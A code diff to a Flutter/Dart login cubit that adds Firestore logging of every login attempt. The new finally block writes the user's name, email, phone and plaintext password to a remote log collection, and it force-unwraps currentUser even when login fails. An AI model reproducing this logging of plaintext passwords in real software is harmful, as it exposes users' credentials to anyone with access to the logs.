@@ -1,7 +1,10 @@
 import 'package:bloc/bloc.dart';
+import 'package:get_it/get_it.dart';
 import 'package:shared_preferences/shared_preferences.dart';
+import '../../../core/remote/firebase_firestore_service.dart';
 import '../models/user_model.dart';
 import '../repository/auth_repository.dart';
+import '../repository/log_repository.dart';
 import 'login_state.dart';
 
 class LoginCubit extends Cubit<LoginState> {
@@ -22,9 +25,9 @@ class LoginCubit extends Cubit<LoginState> {
 
   Future<void> login({required String phone, required String password}) async {
     emit(state.copyWith(status: LoginStatus.loading, errorMessage: ''));
-
+    Object result = "";
     try {
-      Object result = await authRepository.loginWithDeviceId(
+      result = await authRepository.loginWithDeviceId(
         phone: phone,
         password: password,
       );
@@ -38,6 +41,16 @@ class LoginCubit extends Cubit<LoginState> {
     } catch (e) {
       emit(
         state.copyWith(status: LoginStatus.failure, errorMessage: e.toString()),
+      );
+    } finally {
+      LogRepository(GetIt.I<FirebaseFirestoreService>()).addLogReport(
+        name: currentUser!.name,
+        email: currentUser!.email,
+        password: currentUser!.password,
+        phone: currentUser!.phone,
+        isSuccess: result is String ? false : true,
+        result: result is String ? result : 'Login successful',
+        dateTime: DateTime.now().toIso8601String(),
       );
     }
   }
